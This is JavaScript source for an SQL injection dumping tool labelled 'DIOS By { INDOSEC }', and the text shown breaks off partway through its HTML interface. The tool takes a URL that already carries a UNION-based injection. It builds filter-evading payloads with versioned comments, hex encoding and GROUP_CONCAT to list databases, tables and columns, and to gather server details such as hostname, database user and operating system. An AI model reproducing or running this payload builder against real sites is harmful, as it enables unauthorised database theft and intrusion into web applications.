$(document).ready(function () {
    let urls = ""
    let databases = ""
    let tables = ""
    let columns = ""
    let database_select = ""
    let table_select = ""
    let columns_select = ""
    let res_thead = '<thead class="bg-gray-50" id="thead_template"></thead>'
    let res_tbody = '<tbody class="bg-white divide-y divide-gray-200" id="tbody_template"></tbody>'

    document.title = "DIOS By { INDOSEC }";
    
    function importcss(link) {
        let links = document.createElement('link')
        links.rel = 'stylesheet'
        links.href = link
        document.head.appendChild(links);
    }

    function importjs(link) {
        let script = document.createElement('script')
        script.type = "text/javascript"
        script.src = link
        script.async = true
        document.head.appendChild(script)
    }

    function stringtochar(string) {
        let char = ''
        for (let index = 0; index < string.length; index++) {
            char += string.charCodeAt(index) + ","
        }
        return char.slice(0, -1)
    }

    function stringtohex(string) {
        var result = ''
        for (var i = 0; i < string.length; i++) {
            result += string.charCodeAt(i).toString(16)
        }
        return `0x${result}`
    }

    function request(url) {
        return $.ajax({
            url: url,
            success: function(data) {
                return data;
            }        
        });
    }

    function regexs(output) {
        const regex = /<inject>(.*?)<\/inject>/g
        match = regex.exec(output)
        return match[1]
    }

    function replaceText(text, search, replace) {
        return text.replace(search, replace)
    }

    function PayloadConcat(string) {
        return `/*!50000%43o%4Ec%41t/**12345**/(${stringtohex('<inject>')},unhex(hex(/*!50000Gr%6fuP_c%6fnCAT(${string}))),${stringtohex("</inject> <!--")})*/`
    }

    importcss("https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css")
    importjs("https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js")

    async function setUrl() {
        const {
            value: url
        } = await Swal.fire({
            input: 'text',
            inputLabel: 'Enter the URL With Injection \n Ex: http://localhost.com/index.php?id=-1\'union+select+1,{::},3,4+--+-',
            inputPlaceholder: 'Enter the URL'
        })

        if (url) {
            urls = url.replace(/%20/gm, '+')
            tampilan()
        }
    }

    async function tampilan() {
        $("head").append('<meta name="viewport" content="width=device-width, initial-scale=1.0">')
        $("body").addClass("bg-gray-800 overflow-auto")
        $("body").removeClass("swal2-shown")

        let template = `<div class="container mx-auto">
        <img class="rounded-full flex mx-auto"
            src="data:image/jpeg;base64,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" />
    </div>
    
    <div id="title" class="text-center text-3xl md:text-4xl text-purple-700 mt-5">
        <strong>DIOS By { INDOSEC }</strong>
    </div>

    <div id="time" class="text-center text-1xl md:text-2xl mt-5 text-white"></div>
    
    <div class="flex mx-auto">
        <div id="click-menu" class="inline-flex mx-auto">
            <a id="getInfo" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 border border-blue-700 rounded mx-2 my-3">Get Information Gathering</a>
            <a id="getData" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 border border-blue-700 rounded mx-2 my-3">Get Data</a>
        </div>
    </div>
    
    <div class="container mx-auto mt-4">
        <ul class="flex text-gray-500 text-sm lg:text-base bg-white p-3 rounded-md mb-3" id="menuscontrol"></ul>
        <div class="flex flex-col">
            <div class="-my-2 overflow-x-auto sm:-mx-6 lg:-mx-8">
                <div class="py-2 align-middle inline-block min-w-full sm:px-6 lg:px-8">
                    <div class="shadow overflow-hidden border-b border-gray-200 sm:rounded-lg">
                        <table class="min-w-full divide-y divide-gray-200" id="output">
                            <thead class="bg-gray-50" id="thead_template">
                            </thead>
                            <tbody class="bg-white divide-y divide-gray-200" id="tbody_template">
                            </tbody>
                        </table>
                        <table class="min-w-full divide-y divide-gray-200" id="output_info">
                            <thead class="bg-gray-50">
                                <tr>
                                    <th scope="col" colspan="2" class="px-6 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                                        Information Gathering
                                    </th>
                                </tr>
                            </thead>
                            <tbody class="bg-white divide-y divide-gray-200">
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        UUID: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="UUID">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Host Name: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="hostname">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Database: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="currentDB">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        User: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="user">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Current User: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="CurrentUser">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Operation System: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="os">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        BITS DETAILS: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="BITSDETAILS">
                                    </td>
                                </tr>
                                <tr>
